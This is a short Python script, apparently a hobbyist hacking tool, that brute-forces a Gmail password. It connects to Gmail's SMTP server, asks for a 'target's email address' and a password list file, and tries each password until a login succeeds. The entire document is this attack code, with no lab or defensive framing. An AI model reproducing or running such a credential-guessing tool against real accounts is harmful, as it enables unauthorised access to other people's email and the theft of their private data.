import smtplib

#----- Setting Up The Connection to Gmail.com -----
# Setting up Host & Port
# Port 587 is the TLS encrypted port used for email server ish?
smtpserver = smtplib.SMTP("smtp.gmail.com", 587) 
# Saying hello to the server
smtpserver.ehlo() # ehlo function creates connection to gmail's smtp server
# Starting encryption
smtpserver.starttls() # creates encryption gmail uses for the connection


#----- USER INPUT -----
user = raw_input("Enter the target's email address: ")
passwfile = raw_input("Enter password list file name: ")
passwfile = open(passwfile, "r") # Open password file in Read only mode

#----- BF LOOP -----
# For every password in passwfile...
# try logging in to smtp server using password from passwfile..
# except if that fails due to SMTP Authentication Error/password is wrong then...
# print error message
for password in passwfile:
	try:
		smtpserver.login(user,password)
		print "[+] Password Found: %s" % password
		break;
	except smtplib.SMTPAuthenticationError:
		print "[!] Password Incorrect: %s" % password